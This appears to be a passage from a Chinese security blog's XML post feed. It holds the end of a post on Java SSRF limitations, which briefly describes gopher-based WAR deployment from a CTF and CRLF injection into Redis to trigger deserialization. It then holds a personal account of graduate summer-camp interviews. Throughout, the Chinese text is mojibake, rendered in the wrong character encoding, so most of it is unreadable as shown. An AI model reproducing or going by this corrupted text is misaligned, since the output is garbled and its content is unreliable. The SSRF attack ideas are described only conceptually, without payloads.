data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_833165cc8ca6718616040a90ddac4da8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åˆ°è¿™ä¸€æ­¥ä¸éš¾å¾—å‡ºä¸€ä¸ªç»“è®ºï¼šjava urlçš„è¯·æ±‚å‘èµ·åŸºæœ¬éƒ½æ˜¯æ ¹æ®è¾“å…¥æ„å»ºå¥½è¦å‘é€çš„bufferï¼Œå»ºç«‹è¿æ¥åç”¨<code>PrintStream#print</code>æ¥å‘åŒ…çš„ã€‚ä¹Ÿå°±æ˜¯è¯´æ— è®ºç”¨ä»€ä¹ˆåè®®éƒ½ä¼ ä¸è¿›ç‰¹æ®Šå­—ç¬¦ orz</p><h2 id="å¯èƒ½çš„ç‰¹ä¾‹"><a href="#å¯èƒ½çš„ç‰¹ä¾‹" class="headerlink" title="å¯èƒ½çš„ç‰¹ä¾‹"></a>å¯èƒ½çš„ç‰¹ä¾‹</h2><p>  è™½ç„¶ä¸Šé¢è¿™ä¸ªæƒ…æ™¯å¤§æ¦‚ç‡æ˜¯æ²¡æœ‰åŠæ³•åˆ©ç”¨äº†ï¼ˆå¦‚æœæœ‰è¯·åŠ¡å¿…æ•™æ•™æˆ‘ï¼‰ã€‚ä½†æ˜¯java ssrf åœ¨æŸäº›ç‰¹æ®Šåœºæ™¯ä¸‹åº”è¯¥è¿˜æ˜¯èƒ½åˆ©ç”¨çš„ã€‚</p><p>  eg.1: å½“æ—¶å‘ç°è¿™ä¸ªé—®é¢˜åæˆ‘åœ¨googleä¸Šæœäº†ä¸€å¤§åœˆè²Œä¼¼éƒ½æ²¡æœ‰çœ‹åˆ°åˆ†ææ–‡ç« ã€‚ä¸è¿‡åæ¥çœ‹åˆ°ç±»ä¼¼çš„é—®é¢˜balsnçš„å¸ˆå‚…æ›¾ç»åœ¨2018 çš„pwn2win CTFä¸­é‡åˆ°è¿‡ï¼Œ</p><p>  <img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_9a4d28cf9c769c89bdeaa26902a39492.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_9a4d28cf9c769c89bdeaa26902a39492.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å½“ç„¶ä»–è¿™è¯´çš„ä¸å¤Ÿç²¾å‡†ï¼Œæ¯•ç«Ÿè¿™ä¸ªä¸æ˜¯gopherçš„é”…ï¼Œè€Œæ˜¯<code>PrintStream</code>çš„é—®é¢˜ã€‚</p><p>pwn2winçš„åœºæ™¯æ˜¯ç›´æ¥æ„é€ äº†ä¸€ä¸ªå­—ç¬¦é›†åœ¨<code>0x00-0x7f</code>çš„waråŒ…ï¼Œé€šè¿‡gopheræ¥éƒ¨ç½²ä¸Šå»ã€‚ã€‚ã€‚ç›¸å½“å‰å®³</p><p> eg2. æˆ‘èƒ½æƒ³åˆ°çš„å¦ä¸€ä¸ªåœºæ™¯å°±æ˜¯ç”¨crlfå»æ”»å‡»redisï¼Œé€šè¿‡redisè§¦å‘ååºåˆ—åŒ–.å› ä¸ºä½ç‰ˆæœ¬çš„javaè¿˜æ˜¯èƒ½CRLFçš„ï¼Œè€Œredisæ”¯æŒæŠŠ16è¿›åˆ¶å­—ç¬¦åŒ…è£¹èµ·æ¥ï¼Œå³ç›´æ¥ç”¨<code>&quot;\xac\xed&quot;</code>ç­‰ç­‰å¯è§å­—ç¬¦æ¥è®¾ç½®æ•°æ®ã€‚å°±ç®—ä¸è¡Œä¹Ÿå¯ä»¥ç”¨redisçš„å‡½æ•°æ¥è¾…åŠ©ä¸€ä¸‹ã€‚æ‰€ä»¥å‡å¦‚é€šè¿‡rediså­˜å‚¨åºåˆ—åŒ–æ•°æ®å†åœ¨æœåŠ¡ç«¯è§¦å‘ï¼Œå®Œå…¨æ˜¯å¯è¡Œçš„</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>  ä¸åŒçš„åº“å¯¹äºæŸç§åŠŸèƒ½æˆ–è€…è¯´æ˜¯åè®®çš„å®ç°è¿˜æ˜¯æœ‰ç€ä¸å°å·®åˆ«çš„ï¼Œè¿™äº›æœ‰çš„å¯èƒ½å¸¦æ¥æ©˜å­å“¥é‚£ç§ssrfèŠ±å¼ç»•è¿‡ï¼Œä¹Ÿæœ‰çš„å¯èƒ½å°±å¯¼è‡´æˆ‘è¸©çš„è¿™ä¸ªå‘äº†ã€‚ã€‚ã€‚å½“ç„¶è¿˜æ˜¯è¦æ‹’ç»æƒ³å½“ç„¶ï¼Œåªæœ‰åŠ¨æ‰‹è°ƒè¿‡æ‰èƒ½çŸ¥é“å‘åœ¨å“ªã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤ä»¤è¥é¢è¯•ç»å†</title>
      <link href="2021/10/06/%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/"/>
      <url>2021/10/06/%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p>ç®€å•è®°å½•ä¸‹ä»Šå¹´æš‘å‡çš„å¤ä»¤è¥ç»å†ã€‚</p><a id="more"></a><p>æœ€åæ˜¯æ¥å—äº†ä¿¡å·¥æ‰€çš„é¢„å½•å–ï¼Œå¯¹è‡ªå·±è€Œè¨€å¯ä»¥è¯´æ˜¯æ¯”è¾ƒåŠ¡å®çš„é€‰æ‹©äº†ã€‚ä¹ŸæœŸå¾…ä¸‹è‡ªå·±æ˜å¹´çš„ç ”ç©¶ç”Ÿç”Ÿæ´» ğŸ˜ƒ</p><h2 id="åˆæœŸå‡†å¤‡"><a href="#åˆæœŸå‡†å¤‡" class="headerlink" title="åˆæœŸå‡†å¤‡"></a>åˆæœŸå‡†å¤‡</h2><ul><li>ä¸ªäººæƒ…å†µï¼šåŒéå¼ºåŒ–ç­(åˆ†æµä¿¡å®‰ä¸“ä¸š) + GPA rank 3/28 + è‹¥å¹²å­¦ç§‘ç«èµ›å›½å¥– + è‹¥å¹²CTFç«èµ›å›½å¥– + 0ç§‘ç ”0é¡¹ç›®ã€‚</li><li>æŠ¥åï¼šä¿¡å·¥æ‰€ï¼Œå¤æ—¦ï¼Œä¸Šäº¤ï¼ŒåŒ—é‚®ï¼Œå¤©å¤§ï¼Œä¸œå—ï¼Œä¸­ç§‘å¤§ (éƒ½æ˜¯ç›´ç¡•)</li><li>å…¥è¥ï¼š åŒ—é‚® ä¿¡å·¥æ‰€ ä¸œå—</li></ul><p>å…ˆè¯´ä¸‹è‡ªå·±çš„ç›®æ ‡ã€‚å› ä¸ºctfç»å†çš„ç¼˜æ•…ï¼Œæˆ‘å¯¹å®åŠ›éå¸¸å‡ºä¼—çš„ctfæˆ˜é˜Ÿæ‰€åœ¨çš„å­¦æ ¡æ˜¯è‡ªç„¶æŠ±æœ‰å‘å¾€çš„ã€‚æ‰€ä»¥ä¸€å¼€å§‹æˆ‘æŠŠç›®æ ‡å®šåœ¨ä¸Šäº¤0opsï¼Œå¤æ—¦ç™½æ³½ï¼Œä¿¡å·¥æ‰€NeSE,åŒ—é‚®å¤©æ¢ã€‚å»è¿™å‡ ä¸ªå­¦æ ¡çš„éš¾æ˜“ç¨‹åº¦è¿˜æ˜¯æœ‰ä¸€å®šæ¢¯åº¦çš„ï¼Œæ‰€ä»¥æˆ‘è§‰å¾—è¿˜ç®—æ¯”è¾ƒåˆç†å§ã€‚é™¤æ­¤ä»¥å¤–è¿˜è¦ç»™è‡ªå·±ç•™ä¸ªåè·¯ï¼Œæ‰€ä»¥æ‰“ç®—æŠ¥ä¸‹çœå†…ä¸€ç›´æ¯”è¾ƒç…§é¡¾æˆ‘æ ¡çš„ä¸œå—ä½œä¸ºä¿åº•XDã€‚ å½“ç„¶è¿™é‡Œæ²¡æœ‰åŒ…æ‹¬å…¶ä»–ä¸€äº›é«˜æ ¡å¦‚åç§‘ï¼ŒåŒæ ·ä¹Ÿæ˜¯å®åŠ›å‡ºä¼—ç¬¦åˆæˆ‘é€‰æ‹©æ ‡å‡†çš„ï¼Œä¸è¿‡å› ä¸ºæˆ‘ä¸æƒ³å›æ­¦æ±‰æ‰€ä»¥å°±æ²¡æœ‰è€ƒè™‘ã€‚</p><p>ä¸è¿‡æ•´ä½“ä¸Šçœ‹ï¼Œæˆ‘å½“æ—¶è¿˜æ˜¯ä½ä¼°äº†ä»Šå¹´å¤ä»¤è¥çš„å†…å·ç¨‹åº¦ã€‚æœ€æ—©æ˜¯å‘ç°ä¸­ç§‘å¤§ä¿¡ç§‘å¤ä»¤è¥ç¬¬ä¸€æ¡ç›´æ¥å†™æ˜ä¸æ”¶åŒéã€‚ã€‚ã€‚è¿™ä¸ªçœŸçš„å¾ˆä¼¤ã€‚ä¹‹åå°±æ˜¯å¤ä¹ æœŸæœ«çš„æ—¶å€™æ¥åˆ°å¤æ—¦çš„æ‹’ä¿¡ï¼Œä¸§äº†ä¸€ä¸¤å¤©ã€‚æ‰€ä»¥ä¸´æ—¶èµ·æ„æŠ¥äº†å¤©å¤§ã€‚æœ¬æ¥æ‰“ç®—ä¸ç®¡ä¹‹å‰çš„é¡¾å¿Œï¼Œå»æŠ¥åç§‘çš„ã€‚ä½†æ˜¯åç§‘å¤ä»¤è¥éœ€è¦åç§‘ç½‘å®‰è€å¸ˆçš„æ¨èä¿¡ï¼Œæˆ‘ç»™è€å¸ˆå‘äº†é‚®ä»¶å°±ç›´æ¥çŸ³æ²‰å¤§æµ·ï¼Œè‡³ä»Šæœªæ”¶åˆ°å›ä¿¡ã€‚å¯èƒ½æ˜¯èƒ½åŠ›ä¸è¶³ä»¥åŠè”ç³»æ—¶é—´è¿‡æ™šå¯¼è‡´çš„å§ã€‚è¿™äº›å› ç´ éƒ½å¯¼è‡´è‡ªå·±æ—©æœŸç‰¹åˆ«ç‰¹åˆ«ç„¦è™‘ã€‚</p><p>ä¸€æ–¹é¢æ˜¯ä»Šå¹´å¤ä»¤è¥ç¡®å®å·çš„æ›´èƒœå»å¹´ï¼Œè€Œæˆ‘åšå®šè¡¨ç¤ºä¸æŠ•ç›´åšï¼ˆæ‰€ä»¥åäº”åŸºæœ¬æ²¡æˆäº†ï¼‰ï¼Œå¦ä¸€æ–¹é¢æˆ‘æ²¡æœ‰æ‘†å¯¹å§¿æ€æµ·æŠ•é«˜æ ¡ã€‚ï¼ˆä½†æ˜¯åˆ°æœ€åæ„Ÿè§‰æŠ•äº†ä¹Ÿä¸æ„Ÿå…´è¶£çš„ç¡®å®ä¸å¦‚ä¸æŠ•ã€‚</p><p>çœ‹äº†çœ¼å¤æ—¦çš„ï¼ŒæŠ¥è®¡é™¢å¤ä»¤è¥çš„æ€»å…±300ä¸ªï¼Œç½‘å®‰ä¸“ä¸šçš„æ€»å…±50äººã€‚ä¼°è®¡åŸºæœ¬éƒ½æ˜¯985ä¼˜ä¸­é€‰ä¼˜ï¼›äº¤å¤§æ›´ä¸ç”¨è¯´ï¼Œå»å¹´åªæ”¶éC9ä¸“ä¸štop1ï¼Œä¸ç›´åšè‚¯å®šå‡‰å‡‰ã€‚</p><p>äº¤å¤§å¤æ—¦æ²¡å…¥è¥è‡³å°‘ä¼šå‘é‚®ä»¶/çŸ­ä¿¡æ‹’ç»ï¼Œè¿™ä¸ªç®—å¾ˆè´´å¿ƒçš„äº†ã€‚å…¶ä»–çš„å¾ˆå¤šå³ä½¿æ²¡å…¥ä¹Ÿä¸å‘é‚®ä»¶ä¸å‘åå•åè€Œå¼„å¾—æ„éš¾å¹³ã€‚</p><p>æ‰€ä»¥ç°åœ¨çœ‹æ¥å½“æµ·ç‹è¿˜æ˜¯èƒ½å¤Ÿç†è§£çš„ã€‚æ¯•ç«Ÿæ²¡æœ‰985å‡ºèº«ï¼ŒçœŸçš„å¾—é æµ·æŠ•æ¥ç¡®ä¿èƒ½æœ‰ä¸€å®šæ”¶è·ã€‚</p><h2 id="åŒ—é‚®"><a href="#åŒ—é‚®" class="headerlink" title="åŒ—é‚®"></a>åŒ—é‚®</h2><p>åŒ—é‚®ç½‘å®‰å¤§æ¦‚æ˜¯6æœˆä¸­æ—¬å¼€å§‹æŠ¥åï¼Œç„¶å28å·å°±ç»“æŸäº†ã€‚è€Œä¸”é™¤äº†å¡«ç³»ç»Ÿè¿˜è¦é‚®å¯„ææ–™ï¼Œä½†æ˜¯æœ€åå¼€è¥çš„æ—¶å€™è€å¸ˆåˆè¯´ææ–™æ²¡å¯„åˆ°ä¸è¦ç´§ã€‚æœ€åæ‹–åˆ°å¼€è¥å‰ä¸€å¤©é€šçŸ¥å…¥è¥ã€‚å½“æ—¶è¿˜æ˜¯æŒºæœŸå¾…çš„ï¼Œæ¯•ç«Ÿæ˜¯æŠ¥åå¤ä»¤è¥é‡Œé¢ç¬¬ä¸€ä¸ªå…¥è¥æˆåŠŸçš„ã€‚</p><p>ä½†æ˜¯è²Œä¼¼ä»Šå¹´æ˜¯ç¬¬ä¸€å¹´ä»¥ç½‘å®‰å­¦é™¢çš„åä¹‰åŠå¤ä»¤è¥ã€‚å¯¼è‡´æˆ‘è§‰å¾—å¾ˆå¤šåœ°æ–¹ç»†èŠ‚éƒ½æ²¡åšå¥½ã€‚æ¯”å¦‚ç³»ç»Ÿå°±ç‚¸äº†å‡ æ¬¡ï¼ŒæŠ¥å¤šä¸ªå¿—æ„¿æ²¡æ³•çœ‹å‡ºæ˜¯å“ªä¸ªè€å¸ˆé€šè¿‡äº†çš„ã€‚ä¸è¿‡è¯è¯´å›æ¥ï¼ŒåŒ—é‚®çš„å…¥è¥ç”Ÿæºè´¨é‡æˆ‘è§‰å¾—å€’æ˜¯æ„å¤–çš„ä¸é”™ï¼Œè·Ÿåé¢ä¸œå—ç›¸æ¯”ä¹Ÿä¸ç®—å·®ã€‚æˆ‘ä»¬é™¢å¥½åƒä¹Ÿåªè¿›äº†2ä¸ªã€‚</p><p>ç¬¬ä¸€å¤©å®£è®²å®Œåï¼Œæˆ‘æŠ¥çš„ç½‘å®‰8ç»„çš„è€å¸ˆæ‹‰äº†ä¸ªç¾¤ï¼Œç¬¬äºŒå¤©æ¯ä¸ªåŒå­¦ç®€å•é¢äº†3åˆ†é’Ÿå°±ç»“æŸäº†ã€‚ç„¶å4å·ç»“è¥å‰ä¸€å¤©å‘é‚®ä»¶è¯´ä»¥4å‘¨çš„è¿œç¨‹å®ä¹ æ–¹å¼æ¥è¿›è¡Œè€ƒæ ¸ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚<br>5å·ä¸Šåˆè¡¨ç¤ºå› å„æ‹›ç”Ÿç»„â€œå¯¼å¸ˆè§é¢ä¼šâ€æ—¶é—´ä¸ç»Ÿä¸€ï¼ŒæŠ¥é€çš„â€œä¼˜ç§€è¥å‘˜â€æ—¶é—´ä¸åŒï¼ŒåŠ ä¹‹æœ‰å¤šä¸ªå¿—æ„¿åŒæ—¶è¢«å½•å–ä¸ºâ€œä¼˜ç§€è¥å‘˜â€çš„æƒ…å†µ,æ‰€ä»¥ä¸åŠç»“è¥ä»ªå¼ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>4å‘¨çš„è¿œç¨‹å®ä¹ æˆ‘æ˜¯çœŸçš„ä¸ç†è§£ã€‚æ›´å…³é”®çš„æ˜¯åé¢7æœˆ31å·æ‰å‘æ¥æ¶ˆæ¯è®©æˆ‘å‚åŠ ï¼Œåˆšå¥½è·Ÿå­¦æ ¡çš„é¡¹ç›®æ’äº†ï¼ŒåŠ ä¸Šè¿˜åœ¨ç­‰æ²¡å‘é€šçŸ¥çš„ä¸œå—ï¼Œæ‰€ä»¥åªå¥½æ‹’äº†ã€‚</p><p>æ€»çš„æ¥è¯´ï¼ŒåŒ—é‚®ç½‘å®‰å¯èƒ½ç¬¬ä¸€æ¬¡åŠå¤ä»¤è¥å¯¼è‡´å¾ˆå¤šåœ°æ–¹å®‰æ’ä¸å‘¨ï¼ŒåŠ ä¸Šè‡ªå·±æ„Ÿè§‰4å‘¨è¿œç¨‹å®ä¹ è¿™ç§è€ƒæ ¸æ–¹å¼ä¸å¤ªç†æ€§å§ï¼ŒåŸºæœ¬å°±é˜»ç¢ä½ å‚ä¸å…¶ä»–é™¢æ ¡çš„æœºä¼šäº†ã€‚å¸Œæœ›ä»¥åå®‰æ’ä¼šåˆç†äº›ã€‚éš¾åº¦ä¸Šæ²¡å‚åŠ é¢è¯•æ‰€ä»¥æ²¡æ³•è¯„ä»·ï¼Œä½†æ˜¯å…¥è¥é€‰æ‹©ä¸Šç»å¯¹ä¸ç®—ç®€å•ã€‚è®¡ç®—æœºé™¢é‚£è¾¹å·çš„æ›´å‰å®³ï¼Œå¾ˆå¤šå…¥ä¸äº†è¥ä¸è°ˆï¼Œæˆ‘ä»¬ç­rank1æ¥äº†ä¸ªç”µè¯é¢è¯•ï¼Œå¬è¯´ä¸ç›´åšå°±æ²¡åç»­äº†ã€‚</p><h2 id="ä¿¡å·¥æ‰€"><a href="#ä¿¡å·¥æ‰€" class="headerlink" title="ä¿¡å·¥æ‰€"></a>ä¿¡å·¥æ‰€</h2><p>ä¿¡å·¥æ‰€å·®ç‚¹æ²¡å…¥è¥ã€‚ã€‚ã€‚è°éƒ½æƒ³ä¸åˆ°ä»Šå¹´ä¿¡å·¥æ‰€500äººçš„å¤ä»¤è¥è§„æ¨¡ï¼Œç”Ÿæºè´¨é‡å¯èƒ½å†å¹´æœ€å¥½çš„ï¼Œè€Œä¸”è²Œä¼¼æ²¡æœ‰ä»¥å‰çš„éœ¸é¢äº†ï¼ˆå°±æ˜¯æ‰¾è€å¸ˆæä½ å…¥è¥ï¼‰ã€‚7æœˆ9æ—¥é‚£å¤©æœ¬æ¥éƒ½ä»¥ä¸ºå‡‰äº†æ‰“ç®—æš‘å‡æ‘¸é±¼ï¼Œç»“æœç¬¬äºŒå¤©æ”¶åˆ°è¡¥å½•é€šçŸ¥åŸåœ°å¤æ´»ã€‚</p><p>å½“åˆä¿¡å·¥æ‰€æŠ¥åå› ä¸ºæ˜¯æœ€æ—©å¼€å§‹çš„ï¼ŒæŠ¥åå•ä¸Šå¾ˆå¤šèµ„æ–™åœ°æ–¹æˆ‘éƒ½å†™çš„å¾ˆè‰ç‡ï¼Œä¸åƒåé¢å¡«äº†å‡ ä¸ªç³»ç»Ÿåæœ‰ä¸€å¥—æˆç†Ÿçš„è‡ªæˆ‘é™ˆè¿°æ¨¡æ¿äº†ã€‚æ‰€ä»¥å¦‚æœå› ä¸ºè‡ªå·±çš„è‰ç‡å¯¼è‡´é”™è¿‡æœºä¼šä¼°è®¡ä¼šåæ‚”æ­»ã€‚ã€‚ã€‚</p><p>æœ€åå…¥è¥åå•æœ‰600äººï¼Œç”šè‡³5æ¸…å7åŒ—å¤§ã€‚å®é™…å‚è¥çš„å¤§æ¦‚500äººã€‚æˆ‘ä»¬å­¦æ ¡æ€»å…±å°±è¿›4ä¸ªï¼Œ3ä¸ªéƒ½æ˜¯åœ¨500-600ç¼–å·çš„ï¼Œå¤šåŠå°±æ˜¯è¡¥å½•çš„waiting listé‡Œäº†ã€‚å‰é¢åŸºæœ¬å…¨985 211</p><p>ç„¶åç¬¬ä¸€å¤©å¼€ä¸ªè¥ï¼Œç¬¬äºŒå¤©å¬å„ä¸ªå®¤å®£è®²ã€‚6ä¸ªå®¤å®£è®²å®Œåç»™äº†1å°æ—¶åˆ°å„ä¸ªå®¤è‡ªå·±ç»„ç»‡çš„ä¼šè®®é‡Œå»äº¤æµå³ç­”ç–‘ã€‚æˆ‘è¿›å»6å®¤çš„ä¼šè®®åä¸€çœ¼å‘ç°æ€ä¹ˆè¿™ä¹ˆå¤šæ‰“CTFçš„å¸ˆå‚…ï¼Œæœ‰å‡ ä¸ªå¸ˆå‚…çš„idå¥½åƒåŸæ¥xnuca/å·…å³°æå®¢ çº¿ä¸‹ç¾¤é‡Œéƒ½è§è¿‡ã€‚æ›´å…³é”®çš„æ˜¯å°±æˆ‘å­¦æ ¡æœ€æ‹‰ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ä¸€æ—¶é—´å¤±å­¦ææƒ§æ¶Œä¸Šå¿ƒå¤´ã€‚ä¸è¿‡æŠ€æœ¯è‡ªä¿¡è¿˜æ˜¯å¾—æœ‰çš„ã€‚</p><p>äº¤æµæ—¶å¤§å®¶å¥½åƒéƒ½æ¯”è¾ƒå…³æ³¨NeSE,å¯èƒ½è¿™ä¹Ÿæ˜¯6å®¤ç‰¹è‰²å§ã€‚ç„¶åæœ‰äººé—®åˆ°æœºè¯•çš„é—®é¢˜ï¼Œç»“æœå‘ç°ä»Šå¹´6å®¤æœºè¯•åªæœ‰ç®—æ³•é¢˜æ²¡æœ‰CTFäº†ã€‚å¿ƒé‡Œæœ‰ç‚¹å¤±è½ã€‚</p><p>ç¬¬äºŒå¤©æœºè¯•ï¼Œå¥½åœ¨ä¹‹å‰äº†è§£è¿‡6å®¤ç®—æ³•æœºè¯•ä¸éš¾ï¼Œæ‰€ä»¥ä¸æ˜¯å¾ˆæ‹…å¿ƒã€‚å¾€å¹´åº”è¯¥æ˜¯ç°åœºæœºæˆ¿ç»™2é“å¿…åšä¸€é“é€‰åšã€‚æˆ‘ä»¬ä»Šå¹´æœ€åæ˜¯ç‰›å®¢ç½‘ä¸Šä¸‰é“é¢˜ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä¸€ä¸ªæ ˆåˆ¤æ–­æ‹¬å·ï¼Œä¸€ä¸ªå®Œå…¨èƒŒåŒ…çš„æ¿å­é¢˜ï¼Œå¯ä»¥ç”¨c++/java åšã€‚</p><p>ä¹‹å15å·ä¸“ä¸šé¢è¯•+è‹±æ–‡é¢è¯•</p><p>ä¸“ä¸šé¢è¯•æ€»å…±15åˆ†é’Ÿï¼Œä¸Šæ¥å…ˆpptè‡ªæˆ‘ä»‹ç»5åˆ†é’Ÿã€‚<br>åŸºæœ¬å°±ç®€å†å¼ºç›¸å…³ï¼Œé—®ä½ é¡¹ç›®ç»å†</p><ul><li>ä½ æ˜¯åªå»G2ä¹ˆ</li></ul><p>å¡«å¿—æ„¿æ—¶G2+ä¸æœä»è°ƒå‰‚ï¼Œå¯¼è‡´ä¸Šæ¥å°±è¢«é—®åˆ°è¿™ä¸ªé—®é¢˜ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ä¸€æ—¶é—´æ‡µäº†ç«Ÿä¸çŸ¥é“è¯´ä»€ä¹ˆå¥½ï¼Œè¯´æ²¡æœ‰å§ç»“æœåˆè¢«é€¼é—®è¯´ä½ ä¸æ˜¯å¡«äº†ä¸æœä»è°ƒå‰‚ä¹ˆï¼Œæœ€åæˆ‘æ•´äº†ä¸ªâ€å¦‚æœæœ‰å…¶ä»–è€å¸ˆæ„¿æ„è¦æˆ‘è¿˜æ˜¯éå¸¸ä¹æ„çš„â€œã€‚è€å¸ˆéƒ½ç¬‘äº†ä¸€ä¸‹ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ </p><ul><li>æƒ³å»G2æ˜¯å› ä¸ºè¦å»NeSEæ‰“CTFå—</li></ul><p>å¤§éƒ¨åˆ†åŸå› æ˜¯çš„ï¼Œä½†æ˜¯è‚¯å®šä¸æ˜¯åªæ‰“CTFã€‚è¿˜æ˜¯æƒ³å€Ÿæœºä¼šåˆ©ç”¨æ‰€å­¦åšä¸‹é¡¹ç›®ä¹‹ç±»çš„ã€‚æœ¬ç§‘å­¦æ ¡æœŸé—´å®Œå…¨æ²¡æœºä¼šåšwebå®‰å…¨ã€‚</p><ul><li>phpggcè¿™ä¸ªå·¥å…·æ˜¯ä½ è‡ªå·±å†™çš„å—ï¼Œé‚£ä¸ªé“¾å­æ˜¯ä½ æŒ–çš„0dayå—</li></ul><p>è¿™ç§æƒ…å†µæ¯”è¾ƒçƒ¦çš„å°±æ˜¯è¦ä»å¤´å¼€å§‹è§£é‡Šã€‚ã€‚ã€‚å…ˆè§£é‡Šphpggcï¼Œç„¶åè§£é‡Šååºåˆ—åŒ–é“¾æ˜¯å•¥ä»¥åŠä¸ºä»€ä¹ˆä»¥å‰å‚å•†æ”¶æœ€è¿‘å‚å•†ä¸æ”¶ï¼Œæœ€åè§£é‡Šæˆ‘è§‰å¾—æŸç§è§’åº¦ä¹Ÿå¯ä»¥å«0dayã€‚è¿™ä¸€å—è¯´äº†å¥½ä¹…ã€‚</p><ul><li>è®ºæ–‡é¡¹ç›®è¿™å—æœ‰å¯¹æ¯”å·¥ä½œå—ã€‚æ•ˆæœæ€ä¹ˆæ ·</li></ul><p>è™½ç„¶é‚£å—å·¥ä½œä¸æ˜¯æˆ‘è´Ÿè´£çš„ï¼Œä½†æ˜¯è¿˜æ˜¯ç¡¬ç€å¤´çš®æƒ³ç­”ä¸€ä¸‹ï¼Œç»“æœç»•äº†åŠå¤©è¿˜æ˜¯è¯´åšå¯¹æ¯”é‚£å—çš„ç®—æ³•å› ä¸ºä¸æ˜¯æˆ‘è´Ÿè´£çš„æ‰€ä»¥ä¸æ¸…æ¥šã€‚æˆ‘åªå¹²äº†èšç°‡åšcase studyã€‚</p><ul><li>ä½ æ˜¯åªè¯»ä¸“ç¡•å—</li></ul><p>ä¸“ç¡•å­¦ç¡•éƒ½å¯ä»¥ã€‚ç›´åšç¡®å®ä¸è€ƒè™‘ã€‚</p><p>è¿˜æœ‰äº›å¿˜äº†</p><p>è‹±æ–‡é¢è¯•è›®ç®€å•ï¼Œå‡†å¤‡ä¸ªè‡ªæˆ‘ä»‹ç»ç„¶åå›ç­”ä¸¤ä¸ªé—®é¢˜å°±è¡Œã€‚çœ‹èµ·æ¥åƒå›½ç§‘å¤§é‚£è¾¹çš„è€å¸ˆé—®çš„ã€‚</p><p>æœ€åæ‹–äº†æŒºä¹…æ‰å‡ºç»“æœï¼Œæ‹¿äº†ä¼˜è¥ã€‚</p><p>æ•´ä½“ä¸Šä¿¡å·¥æ‰€çš„å®‰æ’æ˜¯æˆ‘å‚åŠ çš„å¤ä»¤è¥é‡Œæœ€è§„èŒƒçš„ï¼ŒåŒ…æ‹¬å¬è®²åº§å…¥ä¼šæœ‰è€å¸ˆæŠŠæ§ï¼Œæœºè¯•é¢è¯•æ—¶ä¸¥æ ¼åŒæœºä½æ£€æŸ¥ç­‰ç­‰ã€‚è§„èŒƒåº¦é«˜è¿™ç‚¹è¿˜æ˜¯å¾ˆé•¿å¥½æ„Ÿçš„ï¼ˆæ²¡æœ‰å¯¹æ¯”å°±æ²¡æœ‰ä¼¤å®³ï¼‰ï¼Œè‡³å°‘è¯æ˜äººå®¶æ˜¯æ¥è®¤çœŸæ‹›ç”Ÿçš„ã€‚éš¾åº¦å¯¹CTFé€‰æ‰‹è€Œè¨€åº”è¯¥åŸºæœ¬ä¸éš¾ï¼Œå› ä¸º6å®¤ä¸ç®—ç‰¹åˆ«ç«ï¼Œå¤§éƒ¨åˆ†æ¥çš„éƒ½æ˜¯æè¿‡å®‰å…¨ç«èµ›çš„ã€‚1å®¤2å®¤å¯èƒ½ä¼šæ›´ç«ä¸€äº›ï¼Œå› ä¸ºå¯èƒ½ä¼šæœ‰ä¸å°‘cså¤§ä½¬è¿‡æ¥ã€‚</p><h2 id="ä¸œå—"><a href="#ä¸œå—" class="headerlink" title="ä¸œå—"></a>ä¸œå—</h2><p>ä¸œå—æŠ¥åå¼€å§‹çš„ä¹Ÿæ™šï¼Œç»“æŸçš„ä¹Ÿæ™šã€‚åŠ ä¸Šç–«æƒ…åŸå› ï¼Œä¼°è®¡æˆäº†å…¨å›½æœ€åä¸€ä¸ªç»“æŸçš„å¤ä»¤è¥ã€‚7æœˆ3æ—¥å¼€å§‹æŠ¥åï¼Œ8æœˆ2æ—¥å‡ºç»“æœã€‚å…¥äº†æœ‰550+å§ã€‚ç„¶åè¦æ±‚è¿›ä¸€æ­¥å‘æŠ¥åè¡¨ï¼Œç®€å†ç­‰ç­‰ææ–™ç»§ç»­å¯¹ä½ è¯„ä¼°å®¡æ ¸ã€‚8æœˆ21å‡ºç»“æœã€‚æ”¶åˆ°çŸ­ä¿¡çœ‹æ˜¯å­¦ç¡•åé¢ã€‚è¿›äº¤æµç¾¤åå‘ç°å¥½åƒç›´æ¥æŒ‰ææ–™å®¡æ ¸çš„ç»“æœåˆ†å­¦ç¡•/ä¸“ç¡•/æ— é”¡ä¸“ç¡•ï¼Œè€Œä¸”ä¸èƒ½æ”¹ï¼Œå·®ä¸å¤šæ€»å…±400äººã€‚</p><p>ä¸è¿‡ä¸œå—çš„offerå‘æ”¾æœºåˆ¶æ˜¯æŒ‰ç…§è¿™ä¸ªåå•ï¼Œç„¶åæŒ‰ç…§é¢è¯•ç»“æœæŠŠä½ 